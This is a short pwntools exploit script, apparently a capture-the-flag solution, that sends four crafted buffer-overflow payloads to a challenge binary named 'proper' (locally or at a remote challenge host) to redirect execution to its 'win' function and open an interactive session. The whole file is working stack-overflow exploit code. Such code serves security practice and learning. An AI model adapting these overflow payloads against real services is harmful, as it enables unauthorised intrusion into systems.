#!/usr/bin/env python3
from pwn import *

PORT = 21543
HOST = "0.cloud.chals.io"
elf = context.binary = ELF('./proper', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

#GDB()

win = elf.sym.win

pl1 = b'A'*0x110
p.sendline(pl1)

pl2 = b'B'*0x208 + p32(0x29) + b'B'*0x4
p.sendline(pl2)

pl3 = b'C'*0x4c + p32(13371337)
p.sendline(pl3)

pl4 = b'D'*(6776) + p64(0x40101a) + p64(win)
p.sendline(pl4)

p.interactive()
